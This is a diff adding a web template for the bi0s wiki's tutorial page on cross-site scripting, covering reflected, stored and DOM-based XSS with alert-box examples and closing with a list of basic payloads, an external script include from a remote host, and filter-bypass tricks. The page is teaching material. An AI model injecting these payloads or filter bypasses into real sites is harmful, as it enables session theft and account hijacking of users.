@@ -1,0 +1,224 @@
+{% extends "bi0s_main.html" %}
+{% block title %}
+<title>XSS - bi0s wiki</title>
+{% endblock %}
+{% block content %}
+{% load static %}
+<div class="md-sidebar md-sidebar--secondary" data-md-component="toc" style="height: 527px;">
+<div class="md-sidebar__scrollwrap">
+<div class="md-sidebar__inner">
+<nav class="md-nav md-nav--secondary">
+<label class="md-nav__title" for="__toc">Table of contents</label>
+<ul class="md-nav__list" data-md-scrollfix="">
+<li class="md-nav__item">
+<a href="#impact" title="Impact" class="md-nav__link">
+Impact
+</a>
+</li>
+<li class="md-nav__item">
+<a href="#types-of-xss" title="Types of XSS" class="md-nav__link">
+Types of XSS
+</a>
+<nav class="md-nav">
+<ul class="md-nav__list">
+<li class="md-nav__item">
+<a href="#reflected-xss" title="Reflected XSS" class="md-nav__link">
+Reflected XSS
+</a>
+</li>
+<li class="md-nav__item">
+<a href="#stored-xss" title="Stored XSS" class="md-nav__link">
+Stored XSS
+</a>
+</li>
+<li class="md-nav__item">
+<a href="#dom-based-xss" title="DOM-based XSS" class="md-nav__link">
+DOM-based XSS
+</a>
+</li>
+</ul>
+</nav>
+</li>
+<li class="md-nav__item">
+<a href="#some-payloads" title="Some payloads" class="md-nav__link">
+Some payloads
+</a>
+</li>
+</ul>
+</nav>
+</div>
+</div>
+</div>
+<div class="md-content">
+<article class="md-content__inner md-typeset">
+<a href="https://gitlab.com/teambi0s/bi0s-wiki/blob/master/docs/web/xss.md" title="Edit this page" class="md-icon md-content__icon"></a><img name="kl_1567872503495" style="width: 12px; height: 12px;" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAACXBIWXMAAAsSAAALEgHS3X78AAAB3ElEQVQ4jY2TPWhTURTH/+e8l7QNJg0qCJpCSdEnONTFDk5udfILs9mS6iJYpI4VnURXUcRJrFG3gm3tXLpIxaUUIVA/iLRJayQ2Nk1q7cu99zjUF/JhQv7jOff/O+fcwyERAQAQEaoVjsdOirgP93L+W5svJpeq8xVfPWD/yPkepekBWbjETl8nM0h9XtkRV72xLbmdn5hJ/xdw4OaVkC6U7oBwg6MRH0d7fGTbQDoLIYKUXa2/rO5C6SdWOHh/4/HrLQCwvZZUoZi2Dh/ysdPbRZ0dNeOQCMj2WXTiaMCUtsdUKn0dQHcNAEZCVr+DViJjYAW6/NqI34txS0eVIqEwRgfONMTbApyORDE3PIbF9dX2AKPHTyESCFbMExeGMTL9EguZVHuAxY3vmBscwtkjfS3NTQELuQzi72bwaGAQ8elEUzNQtQUiLsmf3X3eCt/n1uBMPQUy2bqSDCIuNXQgjHnJ5kzTUt47rUQY8w0AG2ZcLX/bkc2t5m5mlJdTv22Y8QZAPjGbBPHl8oePRb2yruu9BjBu8msRGrF8YjZZGb3+mA5ePee4ip9xoKOfj/UGSRuYtR/b+ldxyW/paz+fv/0EtLhGT91DF2NgubtXnu4VXk1N1vzFP99f037PUFbu4yIAAAAASUVORK5CYII=" width="12" height="12">
+<h1 id="cross-site-scripting-xss">Cross-site scripting (XSS)<a class="headerlink" href="#cross-site-scripting-xss" title="Permanent link">¶</a></h1>
+<blockquote>
+<p>Cross-site scripting (XSS) is a vulnerability found in web 
+applications. It is a code injection attack where the attacker injects 
+malicious code into web pages which are viewed by other users. It occurs
+ when the user input is not properly filtered.XSS effects differ in a 
+scope from a petty nuisance to momentous security risk, based on the 
+sensitivity of the data handled by the target site and the quality of 
+any security mitigation implemented by the site's admin.</p>
+</blockquote>
+<h3 id="impact">Impact<a class="headerlink" href="#impact" title="Permanent link">¶</a></h3>
+<p>The impact of XSS is boundless. A successful XSS may lead to :</p>
+<ul>
+<li>Account hijacking</li>
+<li>Credential stealing</li>
+<li>Leakage of sensitive data</li>
+<li>Display text that seems to come from the site owners,(Like phishing)</li>
+<li>Log keystrokes</li>
+<li>Redirect to another site</li>
+<li>Gain access to camera/microphone if the victim has granted access to that site.</li>
+</ul>
+<h3 id="types-of-xss">Types of XSS<a class="headerlink" href="#types-of-xss" title="Permanent link">¶</a></h3>
+<ol>
+<li>Reflected XSS</li>
+<li>Stored XSS</li>
+<li>DOM-based XSS</li>
+</ol>
+<h4 id="reflected-xss">Reflected XSS<a class="headerlink" href="#reflected-xss" title="Permanent link">¶</a></h4>
+<p>This is the most common type of cross-site scripting 
+vulneribility.Here the payload is a part of HTTP request which should 
+give the HTTP response containing the payload embedded in the page. In 
+this type of attack, the attacker has to deliver the payload to the 
+victim.</p>
+<p>The attacker uses E-mails and other social engineering methods to get
+ the victim click on the link which contains the payload within the 
+link. </p>
+<p><strong><em>Example</em></strong></p>
+<p>Let's see a web page which reflects the input given for id parameter into the web page</p>
+<p><img alt="reflected_xss" src="{% static "bi0s_wiki/xss.png" %}"></p>
+<p>Here the attacker can successfully implement reflected XSS by changing the id parameter to malicious script</p>
+<p>Let's try to pop-up the cookies of the user by injecting a script</p>
+<table class="codehilitetable"><tbody><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1</pre></div></td><td class="code"><div class="codehilite" id="__code_0"><button class="md-clipboard" title="Copy to clipboard" data-clipboard-target="#__code_0 pre, #__code_0 code"><span class="md-clipboard__message"></span></button><pre><span></span>localhost/xss.php?id=<span class="nt">&lt;script&gt;</span>alert(document.cooike)<span class="nt">&lt;/script&gt;</span>
+</pre></div>
+</td></tr></tbody></table>
+<p>This gives us a pop-up containing cookies in the page. </p>
+<p><img alt="reflected_xss" src="{% static "bi0s_wiki/xss_2.png" %}"></p>
+<h4 id="stored-xss">Stored XSS<a class="headerlink" href="#stored-xss" title="Permanent link">¶</a></h4>
+<p>This the most dangerous cross-site scripting attack. The payload 
+injected by the attacker is permenently stored in the web page and 
+whoever visits the page will end up as a vicim of this attack.</p>
+<p>The most common illustration of this type of XSS is a web page 
+containing commentinig functionality. The attacker comments a malicious 
+script which will be stored in the web page, and when othe user who 
+visits this page will be effected by this payload.</p>
+<p><strong><em>Example</em></strong></p>
+<p>Let's see a web page which displays the status given by users.</p>
+<p><img alt="stored_xss" src="{% static "bi0s_wiki/xss_s_1.png" %}"></p>
+<p>Now the attacker can give the status as a payload so that it will be stored in the web application and will effect other user</p>
+<p>Let's try to pop-up the alert with the event handler "onerror"</p>
+<p></p><table class="codehilitetable"><tbody><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1</pre></div></td><td class="code"><div class="codehilite" id="__code_1"><button class="md-clipboard" title="Copy to clipboard" data-clipboard-target="#__code_1 pre, #__code_1 code"><span class="md-clipboard__message"></span></button><pre><span></span><span class="o">&lt;</span><span class="n">img</span> <span class="n">src</span><span class="o">=</span><span class="ss">""</span> <span class="n">onerror</span><span class="o">=</span><span class="ss">"alert(1)"</span><span class="o">&gt;</span>
+</pre></div>
+</td></tr></tbody></table>
+<img alt="stored_xss" src="{% static "bi0s_wiki/xss_s_2.png" %}"><p></p>
+<p>On sharing this status the payload will be stored in the application and whoever visits the page gets a pop-up.</p>
+<p><img alt="stored_xss" src="{% static "bi0s_wiki/xss_s_3.png" %}"></p>
+<h4 id="dom-based-xss">DOM-based XSS<a class="headerlink" href="#dom-based-xss" title="Permanent link">¶</a></h4>
+<hr>
+<p>DOM-based XSS doesn't develop in the HTML part rather develop in the 
+DOM (Document Object Model). i.e unlike reflected and stored XSS attacks
+ where you can see the payload reflected in the web application, 
+DOM-based the source code of the web page remains exactly the same. 
+mostly all the HTML documents have a related DOM, containing the objects
+ characterizing the document properties from the perspective of the 
+browser. Whenever a script is executed client-side, the browser equips 
+the code with the DOM of the web page where the script executes, thus, 
+offering admittance to numerous properties of the web page and their 
+values, populated by the browser from its context.</p>
+<p><strong><em>Example</em></strong></p>
+<p>Consider the following page http://example.com/xss.html containing the below code:</p>
+<table class="codehilitetable"><tbody><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1
+2
+3</pre></div></td><td class="code"><div class="codehilite" id="__code_2"><button class="md-clipboard" title="Copy to clipboard" data-clipboard-target="#__code_2 pre, #__code_2 code"><span class="md-clipboard__message"></span></button><pre><span></span><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
+    <span class="nb">document</span><span class="p">.</span><span class="nx">write</span><span class="p">(</span><span class="s2">"&lt;b&gt;Current URL&lt;/b&gt; : "</span> <span class="o">+</span> <span class="nb">document</span><span class="p">.</span><span class="nx">baseURI</span><span class="p">);</span>
+<span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+</pre></div>
+</td></tr></tbody></table>
+<p>If you send an HTTP request to the web page like this
+</p><table class="codehilitetable"><tbody><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1</pre></div></td><td class="code"><div class="codehilite" id="__code_3"><button class="md-clipboard" title="Copy to clipboard" data-clipboard-target="#__code_3 pre, #__code_3 code"><span class="md-clipboard__message"></span></button><pre><span></span>http://example.com/xss.html#<span class="nt">&lt;script&gt;</span>alert(1)<span class="nt">&lt;/script&gt;</span>
+</pre></div>
+</td></tr></tbody></table><p></p>
+<p>straightforward enough that your JavaScript code will get executed, 
+as the web page is writing whatsoever you typed in the URL to the page 
+with document. write function. If you glance at the source of the page, 
+you won't see \<script>alert(1)\</script> because it's all proceeding in the DOM and done by the executed JavaScript code.</p>
+<h3 id="some-payloads">Some payloads<a class="headerlink" href="#some-payloads" title="Permanent link">¶</a></h3>
+<p><strong>Basic payloads</strong>
+</p><table class="codehilitetable"><tbody><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1
+2
+3
+4
+5
+6
+7</pre></div></td><td class="code"><div class="codehilite" id="__code_4"><button class="md-clipboard" title="Copy to clipboard" data-clipboard-target="#__code_4 pre, #__code_4 code"><span class="md-clipboard__message"></span></button><pre><span></span><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span><span class="nx">alert</span><span class="p">(</span><span class="s1">'XSS'</span><span class="p">)&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">scr</span><span class="err">&lt;</span><span class="na">script</span><span class="p">&gt;</span>ipt&gt;alert('XSS')<span class="err">&lt;</span>/scr<span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span><span class="err">ipt&gt;</span>
+<span class="p">&lt;</span><span class="nt">img</span> <span class="na">src</span><span class="o">=</span><span class="s">x</span> <span class="na">onerror</span><span class="o">=</span><span class="s">alert('XSS');</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">svg</span>
+    <span class="na">onload</span><span class="o">=</span><span class="s">alert(1)</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">body</span> <span class="na">onload</span><span class="o">=</span><span class="s">alert(/XSS/.source)</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">textarea</span> <span class="na">autofocus</span> <span class="na">onfocus</span><span class="o">=</span><span class="s">alert(1)</span><span class="p">&gt;</span>
+</pre></div>
+</td></tr></tbody></table><p></p>
+<p><strong>External payload</strong>
+</p><table class="codehilitetable"><tbody><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1</pre></div></td><td class="code"><div class="codehilite" id="__code_5"><button class="md-clipboard" title="Copy to clipboard" data-clipboard-target="#__code_5 pre, #__code_5 code"><span class="md-clipboard__message"></span></button><pre><span></span><span class="p">&lt;</span><span class="nt">script</span> <span class="na">src</span><span class="o">=</span><span class="s">14.rs</span><span class="p">&gt;</span>
+</pre></div>
+</td></tr></tbody></table><p></p>
+<p><strong>Bypass filters</strong>
+</p><table class="codehilitetable"><tbody><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1
+2
+3
+4
+5
+6
+7
+8
+9</pre></div></td><td class="code"><div class="codehilite" id="__code_6"><button class="md-clipboard" title="Copy to clipboard" data-clipboard-target="#__code_6 pre, #__code_6 code"><span class="md-clipboard__message"></span></button><pre><span></span><span class="p">&lt;</span><span class="nt">sCrIpT</span><span class="p">&gt;</span><span class="nx">alert</span><span class="p">(</span><span class="mi">1</span><span class="p">)&lt;/</span><span class="nt">ScRipt</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">script</span> <span class="na">x</span><span class="p">&gt;</span><span class="err">alert('XSS')&lt;script y&gt;</span>
+eval('ale'+'rt(0)');
+Function("ale"+"rt(1)")();
+new Function`al\ert\`6\``;
+setTimeout('ale'+'rt(2)');
+setInterval('ale'+'rt(10)');
+Set.constructor('ale'+'rt(13)')();
+Set.constructor`al\x65rt\x2814\x29```;
+</pre></div>
+</td></tr></tbody></table><p></p>
+<hr>
+</article>
+</div>
+</div>
+</main>
+<footer class="md-footer">
+<div class="md-footer-nav">
+<nav class="md-footer-nav__inner md-grid">
+<a href="/help/bi0s_wiki/web/os-injection/" title="OS Command Injection" class="md-flex md-footer-nav__link md-footer-nav__link--prev" rel="prev">
+<div class="md-flex__cell md-flex__cell--shrink">
+</div>
+<div class="md-flex__cell md-flex__cell--stretch md-footer-nav__title">
+<span class="md-flex__ellipsis">
+<span class="md-footer-nav__direction">
+Previous
+</span>
+OS Command Injection
+</span>
+</div>
+</a>
+<a href="/help/bi0s_wiki/web/sop/" title="SOP" class="md-flex md-footer-nav__link md-footer-nav__link--next" rel="next">
+<div class="md-flex__cell md-flex__cell--stretch md-footer-nav__title">
+<span class="md-flex__ellipsis">
+<span class="md-footer-nav__direction">
+Next
+</span>
+SOP
+</span>
+</div>
+<div class="md-flex__cell md-flex__cell--shrink">
+</div>
+</a>
+</nav>
+</div>
+{% endblock %}
